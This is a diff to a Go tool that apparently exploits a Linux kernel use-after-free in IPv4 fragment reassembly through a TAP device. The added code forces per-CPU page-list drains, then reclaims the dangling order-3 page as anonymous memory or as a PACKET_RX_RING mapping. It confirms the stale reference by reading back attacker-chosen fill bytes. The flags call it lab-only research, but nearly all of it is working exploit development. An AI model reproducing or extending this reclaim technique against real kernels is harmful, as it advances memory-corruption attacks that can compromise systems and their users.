@@ -19,13 +19,17 @@ import (
 )
 
 const (
-	iffTap       = 0x0002
-	iffNoPI      = 0x1000
-	iffVnetHdr   = 0x4000
-	tunSetIFF    = 0x400454ca
-	tunSetSndBuf = 0x400454d4
-	needsCsum    = 1
-	mapPopulate  = 0x8000
+	iffTap        = 0x0002
+	iffNoPI       = 0x1000
+	iffVnetHdr    = 0x4000
+	tunSetIFF     = 0x400454ca
+	tunSetSndBuf  = 0x400454d4
+	needsCsum     = 1
+	mapPopulate   = 0x8000
+	ipProtoPCP    = 252
+	packetRXRing  = 5
+	packetVersion = 10
+	tpacketV2     = 1
 
 	ethLen     = 14
 	vlanLen    = 4
@@ -104,6 +108,11 @@ type cfg struct {
 	staleLocalRollover  int
 	staleLocalSingleRef bool
 	staleSingleAnchors  int
+	staleSinglePCPPrime int
+	staleSinglePCPWait  time.Duration
+	staleSingleAnon     bool
+	staleSingleRing     bool
+	staleSingleRingSize int
 	staleNaturalAnon    bool
 	staleAnonSize       int
 	staleAnonJumbos     int
@@ -171,6 +180,11 @@ func parseCfg() cfg {
 	flag.IntVar(&c.staleLocalRollover, "stale-local-rollover", 0, "lab-only: page-frag-sized writes after queueing the local reassembly, forcing dangling task_frag refill")
 	flag.BoolVar(&c.staleLocalSingleRef, "stale-local-single-ref", false, "lab-only: keep one coalesced page reference so rollover frees the page cleanly under a stale jumbo descriptor")
 	flag.IntVar(&c.staleSingleAnchors, "stale-single-ref-anchors", 8, "lab-only: incomplete order-3 anchors and reclaim candidates used by the single-ref chain")
+	flag.IntVar(&c.staleSinglePCPPrime, "stale-single-ref-pcp-prime", 0, "lab-only: completed order-3 local datagrams released after the single-reference target to force a PCP drain")
+	staleSinglePCPWaitMs := flag.Int("stale-single-ref-pcp-wait-ms", 1000, "lab-only: grace interval for deferred PCP-prime receive-queue release")
+	flag.BoolVar(&c.staleSingleAnon, "stale-single-ref-anon", false, "lab-only: after PCP priming, reclaim the cleanly freed order-3 target as order-0 anonymous pages")
+	flag.BoolVar(&c.staleSingleRing, "stale-single-ref-packet-ring", false, "lab-only: after PCP priming, reclaim the cleanly freed order-3 target as order-0 PACKET_RX_RING pages")
+	flag.IntVar(&c.staleSingleRingSize, "stale-single-ref-ring-size", 64<<20, "lab-only: bytes in the order-0 PACKET_RX_RING reclaim spray")
 	flag.BoolVar(&c.staleNaturalAnon, "stale-natural-anon", false, "lab-only: reclaim the dangling natural-fragment page as an anonymous mapping and verify a write through task_frag")
 	flag.IntVar(&c.staleAnonSize, "stale-anon-size", 64<<20, "lab-only: bytes of anonymous memory faulted while reclaiming the dangling page")
 	flag.IntVar(&c.staleAnonJumbos, "stale-anon-jumbos", 96, "lab-only: incomplete order-3 fragments released together before the anonymous reclaim")
@@ -194,6 +208,7 @@ func parseCfg() cfg {
 	c.staleDelay = time.Duration(*staleDelayMs) * time.Millisecond
 	c.staleEach = time.Duration(*staleEachUS) * time.Microsecond
 	c.staleAnonWait = time.Duration(*staleAnonWaitMs) * time.Millisecond
+	c.staleSinglePCPWait = time.Duration(*staleSinglePCPWaitMs) * time.Millisecond
 	c.egressWait = time.Duration(*egressWaitMs) * time.Millisecond
 	if c.staleNaturalFrag {
 		applyStaleNaturalFrag(&c)
@@ -292,6 +307,30 @@ func parseCfg() cfg {
 	}
 	if c.staleSingleAnchors < 1 || c.staleSingleAnchors > 64 {
 		fmt.Fprintln(os.Stderr, "-stale-single-ref-anchors must be 1..64")
+		os.Exit(1)
+	}
+	if c.staleSinglePCPPrime < 0 || c.staleSinglePCPPrime > 2048 || (c.staleSinglePCPPrime != 0 && !c.staleLocalSingleRef) {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-pcp-prime must be 0..2048 and requires -stale-local-single-ref")
+		os.Exit(1)
+	}
+	if c.staleSinglePCPWait < 0 || c.staleSinglePCPWait > 10*time.Second {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-pcp-wait-ms must be 0..10000")
+		os.Exit(1)
+	}
+	if c.staleSingleAnon && (!c.staleLocalSingleRef || c.staleSinglePCPPrime == 0) {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-anon requires -stale-local-single-ref and a nonzero -stale-single-ref-pcp-prime")
+		os.Exit(1)
+	}
+	if c.staleSingleRing && (!c.staleLocalSingleRef || c.staleSinglePCPPrime == 0) {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-packet-ring requires -stale-local-single-ref and a nonzero -stale-single-ref-pcp-prime")
+		os.Exit(1)
+	}
+	if c.staleSingleAnon && c.staleSingleRing {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-anon and -stale-single-ref-packet-ring are separate order-0 reclaim experiments")
+		os.Exit(1)
+	}
+	if c.staleSingleRingSize < 8<<20 || c.staleSingleRingSize > 256<<20 || c.staleSingleRingSize%4096 != 0 {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-ring-size must be page-aligned and in 8 MiB..256 MiB")
 		os.Exit(1)
 	}
 	if c.staleAnonSize < 8<<20 || c.staleAnonSize > 1<<30 || c.staleAnonSize%4096 != 0 {
@@ -913,10 +952,35 @@ func runStaleLocalSingleRef(tap *os.File, cap *capture, c cfg, anchorID uint16) 
 			return fmt.Errorf("stale-options: single-ref rollover %d/%d: %w", i+1, c.staleLocalRollover, err)
 		}
 	}
+	pcpFD := -1
+	pcpQueued := 0
+	if c.staleSinglePCPPrime != 0 {
+		pcpFD, pcpQueued, err = holdOrder3PCP(tap, c, localID+0x1000, c.staleSinglePCPPrime)
+		if err != nil {
+			syscall.Close(localRawFD)
+			return err
+		}
+	}
 	if err := syscall.Close(localRawFD); err != nil {
+		if pcpFD >= 0 {
+			syscall.Close(pcpFD)
+		}
 		return fmt.Errorf("stale-options: close single-ref hold socket: %w", err)
 	}
-	time.Sleep(20 * time.Millisecond)
+	if pcpFD >= 0 {
+		if err := syscall.Close(pcpFD); err != nil {
+			return fmt.Errorf("stale-options: close PCP-prime hold socket: %w", err)
+		}
+		time.Sleep(c.staleSinglePCPWait)
+	} else {
+		time.Sleep(20 * time.Millisecond)
+	}
+	if c.staleSingleAnon {
+		return reclaimSingleRefAsAnon(tap, cap, c, anchorID, localID, queued, pcpQueued)
+	}
+	if c.staleSingleRing {
+		return reclaimSingleRefAsPacketRing(tap, cap, c, anchorID, localID, queued, pcpQueued)
+	}
 
 	reclaimID := localID + 1
 	for i := 0; i < c.staleSingleAnchors; i++ {
@@ -965,11 +1029,197 @@ func runStaleLocalSingleRef(tap *os.File, cap *capture, c cfg, anchorID uint16) 
 	return nil
 }
 
+func holdOrder3PCP(tap *os.File, c cfg, baseID uint16, count int) (int, int, error) {
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, ipProtoPCP)
+	if err != nil {
+		return -1, 0, fmt.Errorf("stale-options: open PCP-prime hold socket: %w", err)
+	}
+	ok := false
+	defer func() {
+		if !ok {
+			syscall.Close(fd)
+		}
+	}()
+	if err := syscall.Bind(fd, &syscall.SockaddrInet4{Addr: [4]byte{10, 0, 0, 1}}); err != nil {
+		return -1, 0, fmt.Errorf("stale-options: bind PCP-prime hold socket: %w", err)
+	}
+	rcvbuf := max(4<<20, count*65536)
+	if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, soRcvbufForce, rcvbuf); err != nil {
+		return -1, 0, fmt.Errorf("stale-options: force PCP-prime receive buffer: %w", err)
+	}
+	dst := net.ParseIP("10.0.0.1").To4()
+	for i := 0; i < count; i++ {
+		middle, head, tail := staleNaturalOverlapFramesForProto(c, baseID+uint16(i), dst, ipProtoPCP)
+		if err := writeTapGSO(tap, middle, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
+			false, 0, 0); err != nil {
+			return -1, 0, fmt.Errorf("stale-options: PCP-prime jumbo %d/%d: %w", i+1, count, err)
+		}
+		if err := writeTap(tap, head, false, 0, 0); err != nil {
+			return -1, 0, fmt.Errorf("stale-options: PCP-prime head %d/%d: %w", i+1, count, err)
+		}
+		if err := writeTap(tap, tail, false, 0, 0); err != nil {
+			return -1, 0, fmt.Errorf("stale-options: PCP-prime tail %d/%d: %w", i+1, count, err)
+		}
+	}
+	time.Sleep(20 * time.Millisecond)
+	queued, err := socketQueuedBytes(fd)
+	if err != nil {
+		return -1, 0, fmt.Errorf("stale-options: inspect PCP-prime hold socket: %w", err)
+	}
+	if queued == 0 {
+		return -1, 0, errors.New("stale-options: PCP-prime socket did not queue a completed datagram")
+	}
+	ok = true
+	return fd, queued, nil
+}
+
+func reclaimSingleRefAsAnon(tap *os.File, cap *capture, c cfg, anchorID, localID uint16,
+	queued, pcpQueued int) error {
+	anon, err := syscall.Mmap(-1, 0, c.staleAnonSize, syscall.PROT_READ|syscall.PROT_WRITE,
+		syscall.MAP_PRIVATE|syscall.MAP_ANON|mapPopulate)
+	if err != nil {
+		return fmt.Errorf("stale-options: populate single-ref anonymous reclaim mapping: %w", err)
+	}
+	defer runtime.KeepAlive(anon)
+	const fill = byte(0xa6)
+	for page := 0; page < len(anon); page += 4096 {
+		for i := page; i < min(page+512, len(anon)); i++ {
+			anon[i] = fill
+		}
+	}
+
+	staleAnchor := -1
+	for i := 0; i < c.staleSingleAnchors; i++ {
+		_, head, tail := staleNaturalOverlapFrames(c, anchorID+uint16(i))
+		if err := writeTap(tap, head, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: complete anonymous single-ref anchor %d head: %w", i, err)
+		}
+		if err := writeTap(tap, tail, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: complete anonymous single-ref anchor %d tail: %w", i, err)
+		}
+		pkts := cap.collect(c.capture, anchorID+uint16(i))
+		window, ok := ipv4PayloadWindow(pkts, 16, 32)
+		if !ok {
+			continue
+		}
+		matched := true
+		for _, b := range window {
+			if b != fill {
+				matched = false
+				break
+			}
+		}
+		if matched {
+			staleAnchor = i
+			break
+		}
+	}
+	fmt.Printf("stale-options: single-ref-anon queued_bytes=%d pcp_first_datagram=%d pcp_prime=%d pcp_wait=%s anon_bytes=%d anchors=%d local_id=%#x stale_anchor=%d matched=%t\n",
+		queued, pcpQueued, c.staleSinglePCPPrime, c.staleSinglePCPWait, len(anon), c.staleSingleAnchors,
+		localID, staleAnchor, staleAnchor >= 0)
+	if staleAnchor < 0 {
+		return errors.New("stale-options: cleanly freed order-3 target was not observed in the order-0 anonymous mapping")
+	}
+	return nil
+}
+
+type tpacketReq struct {
+	BlockSize uint32
+	BlockNr   uint32
+	FrameSize uint32
+	FrameNr   uint32
+}
+
+func setPacketRXRing(fd int, req *tpacketReq) error {
+	_, _, errno := syscall.Syscall6(syscall.SYS_SETSOCKOPT, uintptr(fd), uintptr(solPacket),
+		uintptr(packetRXRing), uintptr(unsafe.Pointer(req)), unsafe.Sizeof(*req), 0)
+	if errno != 0 {
+		return errno
+	}
+	return nil
+}
+
+func packetRingRequest(size int) tpacketReq {
+	pages := uint32(size / 4096)
+	return tpacketReq{BlockSize: 4096, BlockNr: pages, FrameSize: 4096, FrameNr: pages}
+}
+
+func reclaimSingleRefAsPacketRing(tap *os.File, cap *capture, c cfg, anchorID, localID uint16,
+	queued, pcpQueued int) error {
+	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPAll)))
+	if err != nil {
+		return fmt.Errorf("stale-options: open PACKET_RX_RING reclaim socket: %w", err)
+	}
+	// Intentionally keep the socket and mapping alive through the stale read.
+	// Releasing either after a successful overlap would perform another put on
+	// a page whose refcount the stale descriptor has already changed.
+	if err := syscall.SetsockoptInt(fd, solPacket, packetVersion, tpacketV2); err != nil {
+		syscall.Close(fd)
+		return fmt.Errorf("stale-options: set PACKET_RX_RING version: %w", err)
+	}
+	pages := c.staleSingleRingSize / 4096
+	req := packetRingRequest(c.staleSingleRingSize)
+	if err := setPacketRXRing(fd, &req); err != nil {
+		syscall.Close(fd)
+		return fmt.Errorf("stale-options: allocate order-0 PACKET_RX_RING: %w", err)
+	}
+	ring, err := syscall.Mmap(fd, 0, c.staleSingleRingSize, syscall.PROT_READ|syscall.PROT_WRITE, syscall.MAP_SHARED)
+	if err != nil {
+		return fmt.Errorf("stale-options: map PACKET_RX_RING reclaim pages: %w", err)
+	}
+	const fill = byte(0xb6)
+	for i := range ring {
+		ring[i] = fill
+	}
+
+	staleAnchor := -1
+	for i := 0; i < c.staleSingleAnchors; i++ {
+		_, head, tail := staleNaturalOverlapFrames(c, anchorID+uint16(i))
+		if err := writeTap(tap, head, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: complete packet-ring single-ref anchor %d head: %w", i, err)
+		}
+		if err := writeTap(tap, tail, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: complete packet-ring single-ref anchor %d tail: %w", i, err)
+		}
+		pkts := cap.collect(c.capture, anchorID+uint16(i))
+		window, ok := ipv4PayloadWindow(pkts, 16, 32)
+		if !ok {
+			fmt.Printf("stale-options: packet-ring anchor=%d window=missing\n", i)
+			continue
+		}
+		fmt.Printf("stale-options: packet-ring anchor=%d window=%s\n", i, hex.EncodeToString(window))
+		matched := true
+		for _, b := range window {
+			if b != fill {
+				matched = false
+				break
+			}
+		}
+		if matched {
+			staleAnchor = i
+			break
+		}
+	}
+	fmt.Printf("stale-options: single-ref-packet-ring queued_bytes=%d pcp_first_datagram=%d pcp_prime=%d pcp_wait=%s ring_bytes=%d ring_pages=%d anchors=%d local_id=%#x stale_anchor=%d matched=%t\n",
+		queued, pcpQueued, c.staleSinglePCPPrime, c.staleSinglePCPWait, len(ring), pages,
+		c.staleSingleAnchors, localID, staleAnchor, staleAnchor >= 0)
+	runtime.KeepAlive(ring)
+	runtime.KeepAlive(fd)
+	if staleAnchor < 0 {
+		return errors.New("stale-options: cleanly freed order-3 target was not observed in the order-0 PACKET_RX_RING")
+	}
+	return nil
+}
+
 func staleNaturalOverlapFrames(c cfg, id uint16) (middle, head, tail []byte) {
 	return staleNaturalOverlapFramesFor(c, id, net.ParseIP("10.99.0.2").To4())
 }
 
 func staleNaturalOverlapFramesFor(c cfg, id uint16, dst net.IP) (middle, head, tail []byte) {
+	return staleNaturalOverlapFramesForProto(c, id, dst, ipProtoRaw)
+}
+
+func staleNaturalOverlapFramesForProto(c cfg, id uint16, dst net.IP, proto byte) (middle, head, tail []byte) {
 	// The second jumbo fragment has the same exact split as the natural
 	// descriptor seed: hdr_len bytes are linear and one order-3 page is
 	// nonlinear. Its logical IPv4 length now retains that whole page, so the
@@ -979,14 +1229,14 @@ func staleNaturalOverlapFramesFor(c cfg, id uint16, dst net.IP) (middle, head, t
 	middlePayload := bytesRepeat(middlePayloadLen, 0x72)
 	src := net.ParseIP("10.0.0.2").To4()
 	middle = frameWithVLAN(ipv4PacketWithOptionsFor(8, true, middlePayload, id, nil,
-		src, dst, ipProtoRaw), c.vlanTags)
+		src, dst, proto), c.vlanTags)
 
 	headPayload := bytesRepeat(8, 0x68)
 	head = frameWithoutVLAN(ipv4PacketWithOptionsFor(0, true, headPayload, id, nil,
-		src, dst, ipProtoRaw))
+		src, dst, proto))
 	tailPayload := bytesRepeat(8, 0x7a)
 	tail = frameWithoutVLAN(ipv4PacketWithOptionsFor(8+middlePayloadLen, false, tailPayload, id, nil,
-		src, dst, ipProtoRaw))
+		src, dst, proto))
 	return middle, head, tail
 }
 
